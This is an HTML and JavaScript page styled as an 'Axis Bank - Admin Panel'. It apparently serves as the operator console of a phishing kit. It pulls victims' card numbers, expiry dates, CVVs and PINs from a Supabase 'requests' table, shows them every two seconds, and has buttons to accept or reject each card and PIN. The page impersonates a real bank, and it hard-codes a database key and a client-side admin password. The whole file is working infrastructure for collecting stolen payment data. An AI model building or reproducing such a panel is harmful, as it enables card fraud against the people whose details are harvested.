<!DOCTYPE html>
<html>
<head>
<title>Axis Bank - Admin Panel</title>
<script src="https://unpkg.com/@supabase/supabase-js@2"></script>
<style>
    *{
        margin:0;
        padding:0;
        box-sizing:border-box;
    }
    body{
        background:#0f0f0f;
        color:white;
        font-family:Arial, sans-serif;
        padding:30px;
    }
    h1{
        margin-bottom:30px;
        text-align:center;
        font-size:40px;
        color:#ff0080;
    }

    /* Login Screen */
    .login-box {
        max-width: 400px;
        margin: 100px auto;
        background: #1b1b1b;
        padding: 40px;
        border-radius: 20px;
        border: 1px solid rgba(255,255,255,0.1);
        text-align: center;
    }
    .login-box input {
        width: 100%;
        padding: 15px;
        margin: 15px 0;
        background: #2a2a2a;
        border: 1px solid #444;
        border-radius: 10px;
        color: white;
        font-size: 16px;
    }
    .login-box button {
        width: 100%;
        padding: 15px;
        background: #ff0080;
        color: white;
        border: none;
        border-radius: 10px;
        font-size: 17px;
        font-weight: bold;
        cursor: pointer;
    }

    /* Main Content */
    .card{
        background:#1b1b1b;
        padding:25px;
        margin-bottom:20px;
        border-radius:20px;
        border:1px solid rgba(255,255,255,0.08);
    }
    .card h3{
        margin-bottom:15px;
        color:#ff0080;
    }
    .card p{
        margin-bottom:10px;
        color:#ddd;
    }
    button{
        padding:12px 18px;
        border:none;
        border-radius:12px;
        margin-right:10px;
        margin-top:10px;
        cursor:pointer;
        font-weight:bold;
        transition:0.3s;
    }
    button:hover{
        transform:scale(1.05);
    }
    .accept{
        background:#00c853;
        color:white;
    }
    .reject{
        background:#ff1744;
        color:white;
    }
    .pin{
        color:#ffd54f;
        font-weight:bold;
    }
    .status{
        color:#00e5ff;
        font-weight:bold;
    }
</style>
</head>
<body>

    <!-- Login Screen -->
    <div id="loginScreen" class="login-box">
        <h2>🔑 Admin Login</h2>
        <p style="margin:15px 0; color:#aaa;">Enter Admin Password</p>
        <input type="password" id="adminPass" placeholder="Enter Password" onkeypress="if(event.key==='Enter') loginAdmin()">
        <button onclick="loginAdmin()">Login</button>
    </div>

    <!-- Main Admin Panel (Hidden by default) -->
    <div id="adminPanel" style="display:none;">
        <h1>Axis Bank - Admin Panel</h1>
        <div id="data"></div>
    </div>

<script>
const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_PASSWORD = "Chut@663";   // ← Yaha apna password change kar sakte ho

// Login Function
function loginAdmin(){
    const enteredPass = document.getElementById('adminPass').value;
    
    if(enteredPass === ADMIN_PASSWORD){
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('adminPanel').style.display = 'block';
        loadData();
    } else {
        alert("❌ Wrong Password! Try Again.");
    }
}

// LOAD DATA
async function loadData(){
    const { data, error } = await client
    .from('requests')
    .select('*')
    .order('id',{ascending:false});

    if(error){
        document.getElementById('data').innerHTML = '<h2>Error Loading Data</h2>';
        console.log(error);
        return;
    }

    let html = '';
    data.forEach(row=>{
        html += `
        <div class="card">
        <h3>Request ID: ${row.id}</h3>
        <p><b>Card Number:</b> ${row.number1}</p>
        <p><b>Expiry:</b> ${row.date_value}</p>
        <p><b>CVV:</b> ${row.number2}</p>
        <p class="status">STATUS: ${row.status}</p>
        `;

        if(row.status === 'pending'){
            html += `
            <button class="accept" onclick="acceptReq(${row.id})">Accept</button>
            <button class="reject" onclick="rejectReq(${row.id})">Reject</button>
            `;
        }

        if(row.pin){
            html += `
            <hr style="margin:20px 0; border-color:#333;">
            <p class="pin">PIN: ${row.pin}</p>
            <p><b>PIN STATUS:</b> ${row.pin_status}</p>
            `;
        }

        if(row.pin_status === 'pending'){
            html += `
            <button class="accept" onclick="acceptPin(${row.id})">Accept PIN</button>
            <button class="reject" onclick="rejectPin(${row.id})">Reject PIN</button>
            `;
        }

        html += `</div>`;
    });

    document.getElementById('data').innerHTML = html || '<p style="text-align:center; color:#888;">No requests yet.</p>';
}

// AUTO REFRESH
setInterval(() => {
    if(document.getElementById('adminPanel').style.display !== 'none'){
        loadData();
    }
}, 2000);

// Accept / Reject Functions
async function acceptReq(id){
    await client.from('requests').update({ status:'accepted' }).eq('id',id);
    loadData();
}
async function rejectReq(id){
    await client.from('requests').update({ status:'rejected' }).eq('id',id);
    loadData();
}
async function acceptPin(id){
    await client.from('requests').update({ pin_status:'accepted' }).eq('id',id);
    loadData();
}
async function rejectPin(id){
    await client.from('requests').update({ pin_status:'rejected' }).eq('id',id);
    loadData();
}
</script>
</body>
</html>
